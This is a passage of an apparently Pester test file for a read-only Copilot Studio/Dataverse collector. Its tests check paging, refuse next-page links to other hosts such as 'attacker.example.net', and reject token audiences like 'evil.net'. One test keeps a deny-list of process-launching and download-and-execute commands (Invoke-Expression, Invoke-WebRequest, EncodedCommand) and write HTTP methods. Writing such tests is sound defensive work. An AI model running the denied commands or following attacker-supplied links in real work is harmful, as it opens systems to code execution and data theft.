            $p1 = [pscustomobject]@{ value = @([pscustomobject]@{ botid = '1' }); '@odata.nextLink' = $p2 }
            $p2 = [pscustomobject]@{ value = @([pscustomobject]@{ botid = '2' }) }
        }
        $r = Invoke-Dv @{ Uri = $p1; Token = 't'; Paged = $true }
        @($r.Rows).Count | Should -Be 2
        $r.Truncated | Should -BeFalse
        @(& $script:Mod { $script:DV_Redirects }) | Should -Not -Contain 1
        $r2 = Invoke-Dv @{ Uri = $p1; Token = 't'; Paged = $true; MaxPages = 1 }
        $r2.Truncated | Should -BeTrue
    }
    It 'refuses a next-page link that leaves the environment host, rather than returning a partial list' {
        $p1 = 'https://contoso.crm.dynamics.com/api/data/v9.2/bots'
        foreach ($next in 'https://other.crm.dynamics.com/api/data/v9.2/bots?$skiptoken=2', 'https://attacker.example.net/api/data/v9.2/bots') {
            Set-Pages @{ $p1 = [pscustomobject]@{ value = @([pscustomobject]@{ botid = '1' }); '@odata.nextLink' = $next } }
            { Invoke-Dv @{ Uri = $p1; Token = 't'; Paged = $true } } | Should -Throw -ExpectedMessage 'refused*' -Because $next
            @(& $script:Mod { $script:DV_Calls }) | Should -Not -Contain "Get $next"
        }
    }
    It 'refuses a response with no value collection' {
        $p1 = 'https://contoso.crm.dynamics.com/api/data/v9.2/bots'
        Set-Pages @{ $p1 = [pscustomobject]@{ error = 'blocked' } }
        { Invoke-Dv @{ Uri = $p1; Token = 't'; Paged = $true } } | Should -Throw
    }
    It 'the token helper requests only the admin API or a Dataverse base URL' {
        & $script:Mod {
            Test-TPPowerPlatformAudience -Audience 'https://service.powerapps.com/' | Should -BeTrue
            Test-TPPowerPlatformAudience -Audience 'https://contoso.crm.dynamics.com' | Should -BeTrue
            foreach ($a in 'https://contoso.crm.dynamics.com/', 'https://graph.microsoft.com', 'https://contoso.crm.dynamics.com/api', 'http://contoso.crm.dynamics.com', 'https://evil.net') {
                Test-TPPowerPlatformAudience -Audience $a | Should -BeFalse -Because $a
            }
            { Get-TPPowerPlatformToken -TenantId 'abcdef01-2345-4678-9abc-def012345678' -Audience 'https://graph.microsoft.com' } | Should -Throw -ExpectedMessage 'refused*'
        }
    }
    It 'the collector and its helpers start no process and make no write request' {
        $src = Get-Content -LiteralPath (Join-Path $script:RepoRoot 'Collectors/PowerPlatform/Invoke-TPCollectCopilotStudio.ps1') -Raw
        $ast = [System.Management.Automation.Language.Parser]::ParseInput($src, [ref]$null, [ref]$null)
        $cmds = @($ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.CommandAst] }, $true) | ForEach-Object { $_.GetCommandName() } | Where-Object { $_ })
        foreach ($bad in 'Start-Process', 'Start-Job', 'powershell', 'pwsh', 'cmd', 'Invoke-WebRequest', 'Invoke-Expression') { $cmds | Should -Not -Contain $bad }
        $src | Should -Not -Match 'System\.Diagnostics\.Process|EncodedCommand'
        $src | Should -Not -Match "-Method\s+(Post|Patch|Put|Delete)"
    }
}
